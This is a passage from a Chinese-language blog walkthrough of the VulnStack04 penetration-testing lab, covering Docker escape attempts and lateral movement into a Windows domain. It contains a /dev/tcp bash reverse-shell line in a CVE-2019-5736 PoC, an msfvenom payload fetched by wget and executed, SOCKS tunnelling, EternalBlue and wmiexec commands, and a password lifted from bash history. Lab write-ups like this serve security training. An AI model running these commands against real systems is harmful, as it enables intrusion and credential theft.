request.</span><br><span class="line">err found <span class="keyword">while</span> searching local K8s apiserver addr.:</span><br><span class="line">err: cannot find kubernetes api host <span class="keyword">in</span> ENV</span><br><span class="line">        api-server forbids anonymous request.</span><br><span class="line">        response:</span><br><span class="line"></span><br><span class="line">[Discovery - K8s Service Account]</span><br><span class="line">load K8s service account token error.:</span><br><span class="line"><span class="built_in">open</span> /var/run/secrets/kubernetes.io/serviceaccount/token: no such file <span class="keyword">or</span> directory</span><br><span class="line"></span><br><span class="line">[Discovery - Cloud Provider Metadata API]</span><br><span class="line"><span class="number">2022</span>/04/<span class="number">17</span> <span class="number">11</span>:<span class="number">14</span>:04 failed to dial Alibaba Cloud API.</span><br><span class="line"><span class="number">2022</span>/04/<span class="number">17</span> <span class="number">11</span>:<span class="number">14</span>:04 failed to dial Azure API.</span><br><span class="line"><span class="number">2022</span>/04/<span class="number">17</span> <span class="number">11</span>:<span class="number">14</span>:04 failed to dial Google Cloud API.</span><br><span class="line"><span class="number">2022</span>/04/<span class="number">17</span> <span class="number">11</span>:<span class="number">14</span>:05 failed to dial Tencent Cloud API.</span><br><span class="line"><span class="number">2022</span>/04/<span class="number">17</span> <span class="number">11</span>:<span class="number">14</span>:05 failed to dial OpenStack API.</span><br><span class="line"><span class="number">2022</span>/04/<span class="number">17</span> <span class="number">11</span>:<span class="number">14</span>:05 failed to dial Amazon Web Services (AWS) API.</span><br><span class="line"><span class="number">2022</span>/04/<span class="number">17</span> <span class="number">11</span>:<span class="number">14</span>:06 failed to dial ucloud API.</span><br><span class="line"></span><br><span class="line">[Information Gathering - Sensitive Files]</span><br><span class="line">        .dockerenv - /.dockerenv</span><br><span class="line">        /.bashrc - /etc/skel/.bashrc</span><br><span class="line">        /.bashrc - /root/.bashrc</span><br><span class="line"></span><br><span class="line">[Information Gathering - ASLR]</span><br><span class="line"><span class="number">2022</span>/04/<span class="number">17</span> <span class="number">11</span>:<span class="number">14</span>:06 /proc/sys/kernel/randomize_va_space file content: <span class="number">2</span></span><br><span class="line"><span class="number">2022</span>/04/<span class="number">17</span> <span class="number">11</span>:<span class="number">14</span>:06 ASLR <span class="keyword">is</span> enabled.</span><br><span class="line"></span><br><span class="line">[Information Gathering - Cgroups]</span><br><span class="line"><span class="number">2022</span>/04/<span class="number">17</span> <span class="number">11</span>:<span class="number">14</span>:06 /proc/<span class="number">1</span>/cgroup file content:</span><br><span class="line">        <span class="number">13</span>:name=systemd:/docker/<span class="number">174745</span>108fcbb3f9cddbb9dc0f54030ccc305920928c9be0de1a04567b152773</span><br><span class="line">        <span class="number">12</span>:pids:/docker/<span class="number">174745</span>108fcbb3f9cddbb9dc0f54030ccc305920928c9be0de1a04567b152773</span><br><span class="line">        <span class="number">11</span>:hugetlb:/docker/<span class="number">174745</span>108fcbb3f9cddbb9dc0f54030ccc305920928c9be0de1a04567b152773</span><br><span class="line">        <span class="number">10</span>:net_prio:/docker/<span class="number">174745</span>108fcbb3f9cddbb9dc0f54030ccc305920928c9be0de1a04567b152773</span><br><span class="line">        <span class="number">9</span>:perf_event:/docker/<span class="number">174745</span>108fcbb3f9cddbb9dc0f54030ccc305920928c9be0de1a04567b152773</span><br><span class="line">        <span class="number">8</span>:net_cls:/docker/<span class="number">174745</span>108fcbb3f9cddbb9dc0f54030ccc305920928c9be0de1a04567b152773</span><br><span class="line">        <span class="number">7</span>:freezer:/docker/<span class="number">174745</span>108fcbb3f9cddbb9dc0f54030ccc305920928c9be0de1a04567b152773</span><br><span class="line">        <span class="number">6</span>:devices:/docker/<span class="number">174745</span>108fcbb3f9cddbb9dc0f54030ccc305920928c9be0de1a04567b152773</span><br><span class="line">        <span class="number">5</span>:memory:/docker/<span class="number">174745</span>108fcbb3f9cddbb9dc0f54030ccc305920928c9be0de1a04567b152773</span><br><span class="line">        <span class="number">4</span>:blkio:/docker/<span class="number">174745</span>108fcbb3f9cddbb9dc0f54030ccc305920928c9be0de1a04567b152773</span><br><span class="line">        <span class="number">3</span>:cpuacct:/docker/<span class="number">174745</span>108fcbb3f9cddbb9dc0f54030ccc305920928c9be0de1a04567b152773</span><br><span class="line">        <span class="number">2</span>:cpu:/docker/<span class="number">174745</span>108fcbb3f9cddbb9dc0f54030ccc305920928c9be0de1a04567b152773</span><br><span class="line">        <span class="number">1</span>:cpuset:/docker/<span class="number">174745</span>108fcbb3f9cddbb9dc0f54030ccc305920928c9be0de1a04567b152773</span><br></pre></td></tr></table></figure>
+
+<p>尝试利用<code>cdk runc-pwn</code>进行<code>CVE-2019-5736</code>进行逃逸，但仍然失败，报错<code>cannot find RunC process inside container</code></p>
+<p>查看其他师傅的文章，5736需要目标机器exec进入docker容器触发。</p>
+<p>本着尽量不交互得想法，尝试其他几种逃逸方法，均失败，，只能通过5736模拟管理员exec进入容器：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Frichetten/CVE-<span class="number">2019</span>-<span class="number">5736</span>-PoC.git</span><br><span class="line"></span><br><span class="line">cd CVE-<span class="number">2019</span>-<span class="number">5736</span>-PoC</span><br><span class="line"></span><br><span class="line">vim main.go</span><br><span class="line"></span><br><span class="line"><span class="comment">#!/bin/bash \n bash -i &gt;&amp; /dev/tcp/192.168.40.129/6666 0&gt;&amp;1</span></span><br><span class="line"></span><br><span class="line">go build main.go</span><br></pre></td></tr></table></figure>
+
+<p><img src="/VulnStack04.htm/2022050625.png" alt="20220506"></p>
+<p>将编译好的main文件利用冰蝎上传，并加权运行</p>
+<p><img src="/VulnStack04.htm/2022050626.png" alt="20220506"></p>
+<p>但不知道什么原因，宿主机也执行了exec，但是仍然无法反弹Shell，payload是一样的，心态很难受。。。。。</p>
+<p>暂时放弃逃逸，直接利用SSH弱密码登录主机，，，，，</p>
+<h3 id="0x05-横向移动"><a href="#0x05-横向移动" class="headerlink" title="0x05 横向移动"></a>0x05 横向移动</h3><p>ifconfig查看内网网段<code>192.168.183.0/24</code></p>
+<p><img src="/VulnStack04.htm/2022050627.png" alt="20220506"></p>
+<p>msf生成shell上传到宿主机执行获取meterpreter,上传ew穿透工具</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.40</span><span class="number">.129</span> LPORT=<span class="number">9999</span> -f elf &gt; shell.elf</span><br><span class="line"></span><br><span class="line">python3 -m http.server <span class="number">6555</span></span><br><span class="line"></span><br><span class="line">宿主机加权执行./ew_for_linux64 -s rssocks -d vps -e <span class="number">8888</span></span><br><span class="line"></span><br><span class="line">kali攻击端执行./ew_for_linux64 -s rcsocks -l <span class="number">1080</span> -e <span class="number">8888</span></span><br><span class="line"></span><br><span class="line">修改proxychains配置文件为sock4 <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">1080</span></span><br><span class="line"></span><br><span class="line">sudo proxychains msfconsole</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> lhost <span class="number">192.168</span><span class="number">.40</span><span class="number">.129</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> lport <span class="number">9999</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">//宿主机执行：</span><br><span class="line">wget http://<span class="number">192.168</span><span class="number">.40</span><span class="number">.129</span>:<span class="number">6555</span>/shell.elf</span><br><span class="line"></span><br><span class="line">chmod <span class="number">777</span> shell.elf</span><br><span class="line"></span><br><span class="line">./shell.elf</span><br></pre></td></tr></table></figure>
+
+<p><img src="/VulnStack04.htm/2022050628.png" alt="20220506"></p>
+<p>接着收集内网信息，得到内网存活主机192.168.183.130&#x2F;131：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s <span class="number">192.168</span><span class="number">.183</span><span class="number">.0</span>/<span class="number">24</span></span><br><span class="line"></span><br><span class="line">use auxiliary/scanner/discovery/udp_probe</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> rhosts <span class="number">192.168</span><span class="number">.183</span><span class="number">.0</span>-<span class="number">255</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> threads <span class="number">20</span></span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/VulnStack04.htm/2022050629.png" alt="20220506"></p>
+<p>对存活主机进行端口扫描，两台主机均开放445端口，且一台为winserver2008，一台为win7，可以判断130为域控，131为域内成员主机：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo proxychains nmap -sS -sV -T <span class="number">4</span> -p22,<span class="number">80</span>,<span class="number">445</span>,<span class="number">1433</span>,<span class="number">3306</span> <span class="number">192.168</span><span class="number">.183</span><span class="number">.130</span> <span class="number">192.168</span><span class="number">.183</span><span class="number">.131</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/VulnStack04.htm/2022050630.png" alt="20220506"></p>
+<p>使用nmap进行445漏洞扫描，得到两台机器均存在MS17-010漏洞：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">sudo proxychains nmap -sS -sV -T <span class="number">4</span> -p <span class="number">445</span> --script=vuln <span class="number">192.168</span><span class="number">.183</span><span class="number">.130</span> <span class="number">192.168</span><span class="number">.183</span><span class="number">.131</span></span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span><span class="number">.183</span><span class="number">.130</span></span><br><span class="line">Host <span class="keyword">is</span> up (<span class="number">0.00059</span>s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE      VERSION</span><br><span class="line"><span class="number">445</span>/tcp <span class="built_in">open</span>  microsoft-ds Microsoft Windows Server <span class="number">2008</span> R2 - <span class="number">2012</span> microsoft-ds (workgroup: DEMO)</span><br><span class="line">Service Info: Host: WIN-ENS2VR5TR3N; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_smb-vuln-ms10-054: false</span><br><span class="line">|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED</span><br><span class="line">| smb-vuln-ms17-<span class="number">0</span>10: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Remote Code Execution vulnerability <span class="keyword">in</span> Microsoft SMBv1 servers (ms17-<span class="number">0</span>10)</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-<span class="number">2017</span>-0143</span><br><span class="line">|     Risk factor: HIGH</span><br><span class="line">|       A critical remote code execution vulnerability exists <span class="keyword">in</span> Microsoft SMBv1</span><br><span class="line">|        servers (ms17-<span class="number">0</span>10).</span><br><span class="line">|           </span><br><span class="line">|     Disclosure date: <span class="number">2017</span>-03-<span class="number">14</span></span><br><span class="line">|     References:</span><br><span class="line">|       https://cve.mitre.org/cgi-<span class="built_in">bin</span>/cvename.cgi?name=CVE-<span class="number">2017</span>-0143</span><br><span class="line">|       https://blogs.technet.microsoft.com/msrc/<span class="number">2017</span>/05/<span class="number">12</span>/customer-guidance-<span class="keyword">for</span>-wannacrypt-attacks/</span><br><span class="line">|_      https://technet.microsoft.com/en-us/library/security/ms17-<span class="number">010.</span>aspx</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span><span class="number">.183</span><span class="number">.131</span></span><br><span class="line">Host <span class="keyword">is</span> up (<span class="number">0.00053</span>s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE      VERSION</span><br><span class="line"><span class="number">445</span>/tcp <span class="built_in">open</span>  microsoft-ds Microsoft Windows <span class="number">7</span> - <span class="number">10</span> microsoft-ds (workgroup: DEMO)</span><br><span class="line">Service Info: Host: TESTWIN7-PC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_samba-vuln-cve-<span class="number">2012</span>-<span class="number">1182</span>: NT_STATUS_ACCESS_DENIED</span><br><span class="line">|_smb-vuln-ms10-054: false</span><br><span class="line">|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED</span><br><span class="line">| smb-vuln-ms17-<span class="number">0</span>10: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Remote Code Execution vulnerability <span class="keyword">in</span> Microsoft SMBv1 servers (ms17-<span class="number">0</span>10)</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-<span class="number">2017</span>-0143</span><br><span class="line">|     Risk factor: HIGH</span><br><span class="line">|       A critical remote code execution vulnerability exists <span class="keyword">in</span> Microsoft SMBv1</span><br><span class="line">|        servers (ms17-<span class="number">0</span>10).</span><br><span class="line">|           </span><br><span class="line">|     Disclosure date: <span class="number">2017</span>-03-<span class="number">14</span></span><br><span class="line">|     References:</span><br><span class="line">|       https://cve.mitre.org/cgi-<span class="built_in">bin</span>/cvename.cgi?name=CVE-<span class="number">2017</span>-0143</span><br><span class="line">|       https://blogs.technet.microsoft.com/msrc/<span class="number">2017</span>/05/<span class="number">12</span>/customer-guidance-<span class="keyword">for</span>-wannacrypt-attacks/</span><br><span class="line">|_      https://technet.microsoft.com/en-us/library/security/ms17-<span class="number">010.</span>aspx</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report <span class="built_in">any</span> incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: <span class="number">2</span> IP addresses (<span class="number">2</span> hosts up) scanned <span class="keyword">in</span> <span class="number">45.49</span> seconds</span><br></pre></td></tr></table></figure>
+
+<p>或者上传fscan进行内网扫描：</p>
+<p><img src="/VulnStack04.htm/2022050631.png" alt="20220506"></p>
+<p>模块利用，但失败，其他师傅都直接打进去，尝试挂了socks代理也同样无法利用，不知道是哪里出现问题：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> rhost <span class="number">192.168</span><span class="number">.183</span><span class="number">.134</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/bind_tcp</span><br><span class="line"></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p><img src="/VulnStack04.htm/2022050632.png" alt="20220506"></p>
+<p>在ubuntu机器执行<code>cat .bash_history | grep 192.168.183</code>命令得到一个密码：<code>douser:Dotest123</code></p>
+<p><img src="/VulnStack04.htm/2022050633.png" alt="20220506"></p>
+<p>尝试利用wmiexec获取权限，仍然失败，，，，在想是不是靶机环境存在什么问题。。。。：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">./ew -s rcsocks -l <span class="number">1080</span> -e <span class="number">8888</span></span><br><span class="line"></span><br><span class="line">./ew -s rssocks -d <span class="number">192.168</span><span class="number">.40</span><span class="number">.130</span> -e <span class="number">8888</span></span><br><span class="line"></span><br><span class="line">proxychains python3 wmiexec.py -debug <span class="string">&quot;douser@Dotest123@192.168.183.134&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/VulnStack04.htm/2022050634.png" alt="20220506"></p>
+<p>查了很多师傅的博客，有直接打进去的，也有很多和我一样怎么都进不去的。win7和server2008均不出网，只能算是个失败的经历。。。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Startseite</a></li>
+         
+          <li><a href="/about/">Über diese Webseite</a></li>
+         
+          <li><a href="/archives/">Artikel</a></li>
+         
+          <li><a href="/">Projekte</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#VulnStack04"><span class="toc-number">1.</span> <span class="toc-text">VulnStack04</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">1.1.</span> <span class="toc-text">一、环境配置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-%E6%A8%A1%E5%BC%8F%E9%85%8D%E7%BD%AE"><span class="toc-number">1.1.1.</span> <span class="toc-text">0x01 模式配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-%E6%9C%8D%E5%8A%A1%E9%85%8D%E7%BD%AE"><span class="toc-number">1.1.2.</span> <span class="toc-text">0x02 服务配置</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="toc-number">1.2.</span> <span class="toc-text">二、渗透测试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.2.1.</span> <span class="toc-text">0x01 信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-%E5%8F%91%E7%8E%B0%E6%80%9D%E8%B7%AF"><span class="toc-number">1.2.2.</span> <span class="toc-text">0x02 发现思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-GetShell"><span class="toc-number">1.2.3.</span> <span class="toc-text">0x03 GetShell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-Docker%E9%80%83%E9%80%B8"><span class="toc-number">1.2.4.</span> <span class="toc-text">0x04 Docker逃逸</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">1.2.5.</span> <span class="toc-text">0x05 横向移动</span></a></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://givemefivw.github.io/2022/04/19/VulnStack04/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://givemefivw.github.io/2022/04/19/VulnStack04/&text=VulnStack04"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://givemefivw.github.io/2022/04/19/VulnStack04/&title=VulnStack04"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://givemefivw.github.io/2022/04/19/VulnStack04/&is_video=false&description=VulnStack04"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VulnStack04&body=Check out this article: https://givemefivw.github.io/2022/04/19/VulnStack04/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://givemefivw.github.io/2022/04/19/VulnStack04/&title=VulnStack04"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://givemefivw.github.io/2022/04/19/VulnStack04/&title=VulnStack04"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://givemefivw.github.io/2022/04/19/VulnStack04/&title=VulnStack04"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://givemefivw.github.io/2022/04/19/VulnStack04/&title=VulnStack04"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://givemefivw.github.io/2022/04/19/VulnStack04/&name=VulnStack04&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://givemefivw.github.io/2022/04/19/VulnStack04/&t=VulnStack04"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menü</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Teilen</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Nach oben</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020-2022
+    givemefivw
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Startseite</a></li><!--
+     --><!--
+       --><li><a href="/about/">Über diese Webseite</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Artikel</a></li><!--
+     --><!--
+       --><li><a href="/">Projekte</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"In die Zwischenablage kopiert!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Kopiert!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
